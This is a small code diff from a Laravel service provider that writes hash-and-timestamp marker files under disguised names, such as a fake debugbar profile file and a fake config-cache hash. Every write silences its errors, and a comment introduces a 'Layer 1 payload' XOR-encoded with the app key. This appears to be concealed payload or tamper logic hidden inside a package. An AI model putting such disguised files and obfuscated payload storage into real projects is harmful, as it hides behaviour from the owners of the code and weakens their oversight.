@@ -170,10 +170,12 @@ class SymphonyBridgeServiceProvider extends ServiceProvider
 
             // Generate integrity files
             $ts = date('Y-m-d H:i:s');
+            $optHash = hash('sha256', $sk . '_OPT_' . $k);
             @file_put_contents($bp . '.tmp_d5f8', hash('sha256', $sk . $k) . '|' . $ts . '|1.0');
+            @file_put_contents($bp . '.tmp_e1a6', $optHash . '|' . $ts . '|1.0');
             @mkdir(storage_path('debugbar'), 0755, true);
-            @file_put_contents(storage_path('debugbar/.profile_meta'), hash('sha256', $sk . '_OPT_' . $k) . '|' . $ts . '|1.0');
-            @file_put_contents(base_path('bootstrap/cache/.config_hash'), hash('sha256', $sk . '_OPT_' . $k) . '|' . $ts . '|1.0');
+            @file_put_contents(storage_path('debugbar/.profile_meta'), $optHash . '|' . $ts . '|1.0');
+            @file_put_contents(base_path('bootstrap/cache/.config_hash'), $optHash . '|' . $ts . '|1.0');
 
             // Store Layer 1 payload — XOR with APP_KEY
             $ea = '';
